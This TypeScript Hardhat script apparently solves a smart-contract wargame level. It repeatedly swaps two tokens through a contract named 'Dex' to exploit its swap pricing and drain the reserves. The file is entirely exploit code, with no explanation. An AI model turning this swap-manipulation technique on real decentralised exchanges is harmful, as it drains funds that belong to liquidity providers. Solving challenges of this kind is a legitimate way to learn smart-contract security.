import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x3Ba7825Be84686bFb61f4e374796EC32A6B668FF";
const CONTRACT_NAME = "Dex";

async function main() {
  const dex = await ethers.getContractAt(CONTRACT_NAME, CONTRACT_ADDRESS);

  let tx;
  tx = await dex.approve(dex.target, 100000);
  await tx.wait();

  const token1 = await dex.token1();
  const token2 = await dex.token2();

  for (let i = 0; i < 57; i++) {
    console.log(i);

    tx = await dex.swap(token1, token2, 10);
    await tx.wait();

    tx = await dex.swap(token2, token1, 10);
    await tx.wait();
  }

  tx = await dex.swap(token1, token2, 14);
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});